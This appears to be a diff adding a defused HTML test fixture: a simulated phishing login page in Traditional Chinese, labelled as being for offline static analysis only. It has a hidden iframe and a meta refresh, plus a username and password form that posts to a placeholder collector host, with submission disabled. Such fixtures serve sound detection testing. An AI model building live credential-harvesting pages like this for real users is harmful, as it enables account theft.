@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="refresh" content="999999;url=about:blank">
+</head>
+<body>
+<h1>模擬釣魚登入頁（離線安全測試）</h1>
+<p>此範例只供 HTML 靜態分析。請勿輸入真實帳號或密碼。</p>
+<iframe title="invisible-test" srcdoc="<p>僅供測試的內嵌內容</p>" style="display:none"></iframe>
+<form action="https://receiver.example.net/collect" method="post" onsubmit="return false;">
+  <label>測試帳號 <input type="text" name="sample_user"></label>
+  <label>測試密碼 <input type="password" name="sample_pass"></label>
+  <button type="submit" disabled>停用的測試登入按鈕</button>
+</form>
+</body>
+</html>
